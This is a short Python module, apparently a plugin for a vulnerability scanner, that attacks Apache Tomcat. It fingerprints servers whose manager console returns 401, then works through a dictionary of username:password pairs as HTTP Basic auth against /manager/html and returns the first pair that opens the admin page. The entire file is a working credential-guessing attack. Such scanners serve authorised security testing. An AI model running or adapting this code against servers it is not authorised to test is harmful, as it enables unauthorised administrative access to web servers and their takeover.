import base64
import time

from vulscan_Project import requestUtil
from .. import fileUtil


def tomcat_poc(url):
    with fileUtil.open_file("dict_tomcat/dic_tomcat_key.txt", "r") as f:
        for i in f.readlines():
            authorized_key = i.strip()
            resp = requestUtil.get(url + "/manager/html", header={
                "Authorization": "Basic %s" % (base64.b64encode(authorized_key.encode()).decode())})
            if "Tomcat Host Manager Application" in resp.text:
                return (["tomcat弱密码", "用户名：%s<br>密码：%s" % (authorized_key.split(":")[0], authorized_key.split(":")[-1])], (base64.b64encode(authorized_key.encode()).decode()))
    return []


def fingerprint(service):
    if not "Apache-Coyote" in service.server:
        return False
    else:
        try:
            resp = requestUtil.get(service.url +"/manager/html")
            if not resp.status_code == 401:
                raise Exception
            else:
                return True
        except:
            return False


def poc(service):
    return tomcat_poc(service.url)
